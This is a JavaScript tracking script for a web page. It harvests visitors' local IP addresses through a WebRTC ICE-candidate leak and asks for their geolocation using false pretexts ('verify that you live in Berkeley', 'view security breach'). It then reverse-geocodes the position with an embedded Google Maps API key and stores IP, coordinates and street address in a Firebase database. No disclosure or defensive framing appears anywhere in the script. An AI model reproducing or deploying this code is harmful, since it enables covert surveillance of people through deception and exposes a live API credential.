
var IPAdress = [];


function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
    //compatibility for firefox and chrome
    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var pc = new myPeerConnection({
        iceServers: []
    }),
    noop = function() {},
    localIPs = {},
    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
    key;

    function iterateIP(ip) {
        if (!localIPs[ip]) onNewIP(ip);
        localIPs[ip] = true;
    }

     //create a bogus data channel
    pc.createDataChannel("");

    // create offer and set local description
    pc.createOffer(function(sdp) {
        sdp.sdp.split('\n').forEach(function(line) {
            if (line.indexOf('candidate') < 0) return;
            line.match(ipRegex).forEach(iterateIP);
        });
        
        pc.setLocalDescription(sdp, noop, noop);
    }, noop); 

    //listen for candidate events
    pc.onicecandidate = function(ice) {
        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
        ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
    };
}

// Usage

function getLocation() {
    console.log("found location");
    alert("Please verify that you live in Berkeley to continue");
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert("Refresh page and allow access to location to view security breach.");
    }
}


function showPosition(position) {
    console.log(position);
    var longitude = position.coords.longitude;
    var latitude = position.coords.latitude;
    var timestamp = position.timestamp;

    var date = new Date(timestamp);
    var month = date.getMonth() + 1;
    var numberedDate = date.getDate();
    var hours = date.getHours();
    var minutes = "0" + date.getMinutes();

    var formattedTime = month + "-" + numberedDate + " Time: " + hours + ':' + minutes.substr(-2);
    sendToFireBase(formattedTime, longitude, latitude);

    getUserIP(function(ip){
        IPAdress.push(ip);
    });

    var xhr = new XMLHttpRequest();
    xhr.open('GET', "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + latitude + "," + longitude + "&key=AIzaSyAn433CkQIr3rTmdkUeseMSYGUAqBxrv3M", true);
    xhr.send();
    xhr.addEventListener("readystatechange", processRequest, false);

    function processRequest(e) {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var response = JSON.parse(xhr.responseText);
            console.log(response);
            sendToFireBaseWithAddress(response.results[0].formatted_address,response.results[1].formatted_address,formattedTime, longitude, latitude);
        }
    }


}

function sendToFireBase(formattedTime, longitude, latitude) {
    database.ref(  "Email Website (not homework)" + formattedTime ).set({
        IP: IPAdress.toString(),
        address: "none",
        address2: "none",
        longitude: longitude,
        latitude: latitude
    });
}

function sendToFireBaseWithAddress(address,address2,formattedTime, longitude, latitude) {

    database.ref( "Email Website (not homework)" + formattedTime  ).set({
        IP: IPAdress.toString(),
        address: address,
        address2: address2,
        longitude: longitude,
        latitude: latitude
    });

}

function sendToFireBaseWithIP() {

    database.ref( "Email Website (not homework)" + formattedTime  ).set({
        IP: IPAdress.toString()
    });

}
